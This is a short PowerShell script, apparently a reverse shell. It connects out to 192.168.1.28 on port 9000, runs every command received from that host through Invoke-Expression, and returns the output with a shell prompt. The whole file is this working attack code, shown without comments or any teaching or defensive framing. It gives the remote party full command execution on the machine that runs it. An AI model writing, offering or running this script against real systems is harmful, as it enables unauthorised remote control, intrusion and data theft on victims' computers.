$IPAddress = "192.168.1.28"
$Port = 9000

$Client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
$Stream = $Client.GetStream()

$Bytes = [byte[]](0..65535|%{0})
while (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
{
    $Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes, 0, $i)
    $Sendback = (Invoke-Expression $Data 2>&1 | Out-String)
    $Sendback += "PS " + (Get-Location).Path + "> "
    $Sendbyte = ([text.encoding]::ASCII).GetBytes($Sendback)
    $Stream.Write($Sendbyte, 0, $Sendbyte.Length)
    $Stream.Flush()
}

$Client.Close()
